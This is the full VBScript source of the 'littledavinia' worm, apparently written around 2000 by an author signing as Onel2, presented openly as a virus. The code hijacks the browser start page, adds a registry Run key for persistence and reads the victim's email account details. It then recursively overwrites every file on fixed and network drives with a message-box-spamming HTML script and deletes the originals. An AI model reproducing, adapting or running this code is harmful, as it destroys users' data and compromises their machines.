Rem littledavinia version 1.0 Visual Basic Macro - VBS - HTML(vbs) Worm Virus
Rem Office 2000 UA ActiveX bug
Rem written by: Onel 2 / Melilla,España / 25 Diciembre
Rem Quiero a Davinia:
On Error Resume Next
Dim fso, reg, ildav, dirwin, dirsystem, a
Set fso = CreateObject("Scripting.FileSystemObject")
Set reg = CreateObject("WScript.Shell")
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
reg.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://"
reg.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Davinia", dirsystem & "\littledavinia.html"
listingdrives()
Sub listingdrives()
On Error Resume Next
Dim d, dc, s
Set dc = fso.Drives
For Each d In dc
If d.DriveType = 2 Or d.DriveType = 3 Then
listingfolders (d.Path & "\")
End If
Next
listingdrives = s
End Sub
Sub declaratelovetodavinia(folderspec)
On Error Resume Next
Dim f, f1, fc, of, love, hd, ctf, nm, eml, isp, gf
Set f = fso.GetFolder(folderspec)
Set fc = f.Files
nm = reg.RegRead("HKCU\Software\Microsoft\Internet Account Manager\Accounts\00000001\SMTP Display Name")
eml = reg.RegRead("HKCU\Software\Microsoft\Internet Account Manager\Accounts\00000001\SMTP Email Address")
If (nm = "") Then
nm = "no lo se"
ElseIf (eml = "") Then
eml = "vete tu a saber"
end If
love="<HTML><HEAD><TITLE>Quiero a Davinia</TITLE><META NAME=^_^;Author^_^; CONTENT=^_^;Onel2 virus programmmer / Melilla, España / 25 Diciembre 2000^_^;>"&vbcrlf&_
"</HEAD><SCRIPT LANGUAGE=^_^;VBScript^_^;><!--"&vbcrlf&_
"'algo muy simple puede convertirse en una pesadilla..."&vbcrlf&_
"For i = 0 to 41239149113518225191911272214491"&vbcrlf&_
"MsgBox ^_^; Hola, tu nombre es " & nm & ". ^_^; & chr(13) & ^_^; Tu email es " & eml & ".^_^; & chr(13) & ^_^;Yo soy Onel2, y vivo en Melilla^_^; & chr(13) & ^_^;una ciudad del norte de Africa.^_^; & chr(13) & ^_^;Estoy enamorado de una chica llamada Davinia.^_^; & chr(13) & ^_^;Ella es la mas guapa del mundo.^_^; & chr(13) & ^_^;Es como una diosa.^_^; & chr(13) & ^_^;Igual que yo me contagie de amor^_^; & chr(13) & ^_^; de Davinia, tus archivos se van a^_^; & chr(13)  & ^_^;contagiar de amor de esta pagina^_^; & chr(13) & ^_^;Davinia(chica) y Davinia(virus) rompen corazones y archivos.^_^; & chr(13) & ^_^;littledavinia version 1.1 esta en camino...^_^;,2+16+256+4096,^_^; Onel2 - Melilla^_^;"&vbcrlf&_
"Next"&vbcrlf&_
"--></SCRIPT></HTML>"
love = Replace(love, Chr(94) & Chr(95) & Chr(94) & Chr(59), """")
For Each f1 In fc
Set of = fso.OpenTextFile(f1.Path, 2, True)
of.write love
of.Close
Set of = fso.GetFile(f1.Path)
of.Copy (f1.Path & ".html")
fso.DeleteFile (f1.Path)
Next
Set ctf = fso.CreateTextFile(dirsystem & "\littledavinia.html")
ctf.write love
ctf.Close
End Sub
Sub listingfolders(folderspec)
On Error Resume Next
Dim f, f1, sf
Set f = fso.GetFolder(folderspec)
Set sf = f.SubFolders
For Each f1 In sf
declaratelovetodavinia (f1.Path)
listingfolders (f1.Path)
Next
End Sub
